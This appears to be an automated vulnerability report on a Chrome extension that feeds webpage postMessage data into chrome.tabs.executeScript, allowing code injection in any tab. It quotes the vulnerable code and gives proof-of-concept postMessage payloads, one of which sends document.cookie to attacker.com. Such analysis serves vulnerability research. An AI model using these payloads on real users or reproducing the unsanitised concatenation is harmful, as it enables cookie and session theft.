# CoCo Analysis: abkbmnbcmfehcbfjkpagdmloiondlbne

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink: cs_window_eventListener_message → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/abkbmnbcmfehcbfjkpagdmloiondlbne/opgen_generated_files/cs_0.js
Line 483	window.addEventListener("message", function(event) {
Line 487	if (event.data.type && (event.data.type == "LV_PCIDSS_TRIGGER")) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/abkbmnbcmfehcbfjkpagdmloiondlbne/opgen_generated_files/bg.js
Line 977	if (request.event == "PAUSE" && curTitle.endsWith(request.windowTitle) == false)
Line 979	chrome.tabs.executeScript(tab.id,{code:"document.title = '" + curTitle + request.windowTitle + "'"});
Line 986	chrome.tabs.executeScript(tab.id,{code:"document.title = '" + curTitle.replace(request.windowTitle,"") + "'"});
Line 989	chrome.tabs.executeScript(tab.id,{code:"document.title = '" + curTitle.replace(request.windowTitle,"") + "'"});
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener("message", function(event) {
    if (event.source != window)
        return;

    if (event.data.type && (event.data.type == "LV_PCIDSS_TRIGGER")) {
        console.log("LiquidPause.Event: " + event.data.event);
        chrome.runtime.sendMessage(event.data); // ← attacker-controlled via postMessage
    }
});

// Background script (bg.js) - Message handler
function handleEvent(request, sender, sendResponse) {
    chrome.tabs.query({'active': true, 'windowId': chrome.windows.WINDOW_ID_CURRENT},
        function(tab){
            var curTitle = tab[0].title;
            console.log('LiquidPause.Background.Process: ' + request.event)
            clearTimeout(delayResume);

            if (request.event == "PAUSE" && curTitle.endsWith(request.windowTitle) == false)
            {
                // request.windowTitle is attacker-controlled - injected into executeScript!
                chrome.tabs.executeScript(tab.id,{code:"document.title = '" + curTitle + request.windowTitle + "'"}); // ← Code injection
            }

            if (request.event == "RESUME")
            {
                if (request.timeOut > 0)
                    delayResume = setTimeout(function() {
                        chrome.tabs.executeScript(tab.id,{code:"document.title = '" + curTitle.replace(request.windowTitle,"") + "'"}); // ← Code injection
                    }, request.timeOut);
                else
                    chrome.tabs.executeScript(tab.id,{code:"document.title = '" + curTitle.replace(request.windowTitle,"") + "'"}); // ← Code injection
            }
        }
    );
    sendResponse({completed: true});
}

chrome.runtime.onMessage.addListener(handleEvent);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From any webpage where the content script is injected (all_urls):
window.postMessage({
    type: "LV_PCIDSS_TRIGGER",
    event: "PAUSE",
    windowTitle: "'; alert(document.cookie); var x='"
}, "*");

// This injects code into executeScript:
// chrome.tabs.executeScript(tab.id, {
//     code: "document.title = '<curTitle>'; alert(document.cookie); var x=''"
// });

// Alternative - steal cookies via exfiltration:
window.postMessage({
    type: "LV_PCIDSS_TRIGGER",
    event: "PAUSE",
    windowTitle: "'; fetch('https://attacker.com/?c='+document.cookie); var x='"
}, "*");
```

**Impact:** Arbitrary JavaScript execution in the context of any tab. Attacker can inject malicious code by breaking out of the string literal in the executeScript call. The extension fails to sanitize `request.windowTitle` before concatenating it into executable code, allowing attackers to escape the string context using quotes and inject arbitrary JavaScript. This enables stealing cookies, credentials, session tokens, or performing actions on behalf of the user.
